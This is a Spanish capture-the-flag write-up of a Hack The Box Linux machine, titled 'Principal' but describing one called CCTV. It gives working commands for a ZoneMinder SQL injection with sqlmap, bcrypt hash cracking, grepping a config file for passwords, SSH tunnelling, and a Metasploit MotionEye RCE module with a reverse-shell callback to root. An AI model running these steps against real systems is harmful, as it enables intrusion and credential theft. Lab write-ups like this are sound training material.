# HTB - Principal Writeup

**Autor:** TRNNSK
**Dificultad:** Easy (no debería estar catalogada como easy, pero ya verán ellos)
**Sistema:** Linux

---

# Resumen

La máquina **CCTV** presenta un par de vulnerabilidades que debemos escalar para llegar al manejo y control total de root, vamos a hacer uso de CVE-2024–51482, una vulnerabilidad en ZoneMinder, para poder enumerar la DB de usuarios, y posteriormente de CVE-2025-60787, para escalar privilegios gracias a que no está correctamente sanitizado el área de cámaras de MotionEye, app encontrada luego.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sC -sV 10.129.12.220
```

### Resultados:

```
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    Apache httpd 2.4.58
```

---

# Análisis Web

Al acceder al puerto 80, se identifica una aplicación web con autenticación basado en ZoneMinder, y poco más, se intenta acceder con las claves por defecto: admin y admin, y logramos acceder.

---

# Vulnerabilidad: CVE-2024–51482

Se identifica que la aplicación es vulnerable al CVE-2024–51482 por la versión que se aprecia en la parte superior derecha de la pantalla de administración de ZoneMinder, esta vulnerabilidad deja hacer SQL injection.

### Explicación técnica:

- No está sanitizado el proceso, dejando espacio para una injección SQL.
- Ya que la injección está basado en booleanos, no devuelve data como tal, pero cambia el comportamiento normal.
- El POC es esta sentencia: http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1

---

# Explotación (Foothold)

Vamos a ingresar a través del SSH con contraseñas legítimas obtenidas con sqlmap, aprovechandonos de que es vulnerable a SQLinjection:

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie 'ZMSESSID=qj2q8jr8salrhk72gmv90g1qar' --batch -p tid --current-db
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie 'ZMSESSID=9vs3h1ip4h0qus27ddq1dbhbns' --batch -p tid -D zm -T Users -C Username,Password --dump
```

### Output:

```
Se obtiene después de un largo rato, por la naturaleza de la vulnerabilidad:
```
```bash
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```
Vamos a usar John the ripper para probar si hay alguna contraseña débil a la mano
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt mark.hash
?: opensesame
```
Con esto resuelto podemos hacer login a través de SSH con: mark y opensesame respectivamente para tener el acceso incial.

---

# Escalada de Privilegios
```
Para escalar privilegios vamos a hacer uso de CVE-2025-60787.
```
## Enumeración de servicios

```bash
netstat -tulp
```

Resultado:

```bash
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:1935          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:7999          0.0.0.0:*               LISTEN      -                   
tcp        0      0 _localdnsproxy:domain   0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:9081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8888          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8765          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8554          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 _localdnsstub:domain    0.0.0.0:*               LISTEN      -                   
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -                   
udp        0      0 _localdnsproxy:domain   0.0.0.0:*                           -                   
udp        0      0 _localdnsstub:domain    0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                           -                   
mark@cctv:~$ 
```

De aqui, el que nos importa es el servicio corrienod en 8765, que es MotionEye.
---

## Acceso a recursos sensibles
Intentamos acceder a las credenciales de motionEye a través de mark, y vemos que podemos hacerlo:
```bash
cat /etc/motioneye/motion.conf | grep -i "admin\|password"
```

## Port Forwarding con SSH:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

### Resultado esperado:
```
Cuando entremos a través del 127.0.0.1:8765 podamos ver lo que pasa en MotionEye, ya que está configurado para que se vea solamente desde localhost en la original, así que lo traemos para la PC local.
```

## Metasploit:
```
Ya que la vulnerabilidad de la que nos vamos a aprovechar está bien documentada, y accesible a través de metasploit, vamos a usarlo.
```
```bash
msfconsole -q
use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
set RHOSTS 127.0.0.1
set RPORT 8765
set USERNAME admin
set PASSWORD <contraseña que encontramos con mark al hacer cat al archivos de configuración del programa>
set LHOST tun0
set LPORT 4444
run
```
```
Listo, ya tenemos root, y podemos buscar las flags que necesitemos para mandar a HTB.
```
---


# TLDR MUCHO TEXTO

1. Escanear con Nmap
2. Analizar aplicación web
3. Identificar endpoints
4. Entrar con credenciales default
5. Enumerar la DB gracias al SQLinjection
6. Johnn the ripper para obtener la password de mark
7. Obtener credenciales para MotionEye a traves de mark
8. Port Forwarding con SSH
9. Usar metasploit para escalar a root

---

# Conclusión

Esta máquina demuestra cómo:

- Una mala sanitización de SQL permite enumerar DB
- La mala configuración de accesos a recursos sensibles expone contraseñas
- Una versión de un programa vulnerable permite escalada completa y puede llevar a un compromiso total del sistema.

---

y ya

